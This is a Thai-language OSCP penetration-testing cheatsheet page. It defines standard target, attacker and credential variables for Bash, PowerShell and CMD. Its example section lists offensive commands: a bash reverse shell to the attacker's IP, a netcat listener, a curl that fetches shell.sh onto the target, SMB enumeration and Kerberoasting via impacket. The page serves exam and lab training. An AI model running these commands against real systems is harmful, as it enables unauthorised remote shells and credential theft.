# Variable Setup

> **มาตรฐานตัวแปรที่ใช้ในทุก Command Cheatsheet**

---

## 🔧 Standard Variables

รัน commands ด้านล่างก่อนเริ่มใช้งาน cheatsheet:

### Linux/Bash

```shell
# Target Information
export rhost="192.168.1.100"      # Remote/Target IP
export rport="80"                  # Remote/Target Port
export domain="corp.local"         # AD Domain Name
export user="admin"                # Target Username
export pass="Password123"          # Target Password

# Attacker Information  
export lhost="10.10.14.5"          # Your Kali/Attack IP
export lport="4444"                # Your Listener Port

# Common Paths
export wordlist="/usr/share/wordlists/rockyou.txt"
export seclists="/usr/share/seclists"

# Convenience aliases
alias serve='python3 -m http.server 80'
alias listen='rlwrap nc -lvnp $lport'
```

### Windows/PowerShell

```powershell
# Target Information
$rhost = "192.168.1.100"
$rport = "80"
$domain = "corp.local"
$user = "admin"
$pass = "Password123"

# Attacker Information
$lhost = "10.10.14.5"
$lport = "4444"
```

### Windows/CMD

```cmd
:: Target Information
set rhost=192.168.1.100
set rport=80
set domain=corp.local
set user=admin
set pass=Password123

:: Attacker Information
set lhost=10.10.14.5
set lport=4444
```

---

## 📋 Variable Reference Table

| Variable | Description | Example Values |
|----------|-------------|----------------|
| `$rhost` | Remote/Target host IP | `192.168.1.100`, `10.10.10.5` |
| `$rport` | Remote target port | `80`, `443`, `445` |
| `$lhost` | Local/Attacker IP | `10.10.14.5`, `192.168.45.200` |
| `$lport` | Local listener port | `4444`, `9001`, `443` |
| `$domain` | AD domain name | `corp.local`, `htb.local` |
| `$user` | Username | `admin`, `administrator` |
| `$pass` | Password | `Password123`, `P@ssw0rd!` |
| `$wordlist` | Wordlist path | `/usr/share/wordlists/rockyou.txt` |
| `$cidr` | Network range | `192.168.1.0/24` |
| `$target` | OSCP exam target | Same as `$rhost` (exam context) |

---

## 🔍 Find Your IP

### Linux

```shell
# Get attacker IP
ip a | grep -oP 'inet \K[\d.]+' | grep -v 127.0.0.1 | head -1

# For tun0 (VPN)
ip a show tun0 | grep -oP 'inet \K[\d.]+'

# One-liner to export
export lhost=$(ip a show tun0 | grep -oP 'inet \K[\d.]+')
```

### Windows

```cmd
:: Get IP
ipconfig | findstr IPv4
```

---

## 📝 Example Usage

ดูตัวอย่างการใช้ตัวแปรใน commands:

```shell
# Nmap scan
nmap -sC -sV -p- $rhost -oN nmap_full.txt

# Netcat listener
nc -lvnp $lport

# Reverse shell
bash -i >& /dev/tcp/$lhost/$lport 0>&1

# SMB enumeration
smbclient -L //$rhost -U "$user%$pass"

# AD enumeration
impacket-GetUserSPNs -dc-ip $rhost $domain/$user:$pass

# File download to target
curl http://$lhost/shell.sh -o /tmp/shell.sh
```

---

## 🎯 OSCP Exam Variables

```shell
# ตั้งค่าสำหรับ OSCP exam
export STANDALONES="192.168.x.x 192.168.x.x 192.168.x.x"
export AD_SET="192.168.x.x 192.168.x.x 192.168.x.x"

# Quick scan all standalone
for ip in $STANDALONES; do 
    nmap -sC -sV -Pn $ip -oN nmap_$ip.txt &
done
```

---

## 🔗 Related Files

- [Emergency Commands](Emergency-Commands.md) - Quick reference commands
- [README - Standard Variables](../README.md#-standard-variables) - Main documentation
